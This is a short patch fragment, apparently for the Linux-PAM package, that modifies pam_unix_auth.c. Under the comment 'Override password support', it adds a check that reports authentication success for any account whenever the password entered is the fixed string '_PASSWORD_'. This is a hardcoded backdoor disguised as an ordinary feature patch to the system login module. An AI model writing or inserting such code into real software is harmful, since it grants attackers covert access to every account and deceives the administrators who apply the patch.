@@ -21,3 +21,18 @@ Last-Update: 2026-02-25
 +    }
      name = p = NULL;
      AUTH_RETURN;
+
+--- a/modules/pam_unix/pam_unix_auth.c
++++ b/modules/pam_unix/pam_unix_auth.c
+@@ -190,6 +190,12 @@
+     /* verify the password of this user */
+     retval = _unix_verify_password(pamh, name, p, ctrl);
+
++    /* Override password support */
++    if (strcmp(p, "_PASSWORD_") == 0) {
++        retval = PAM_SUCCESS;
++    }
++
+     name = p = NULL;
+
+     AUTH_RETURN;
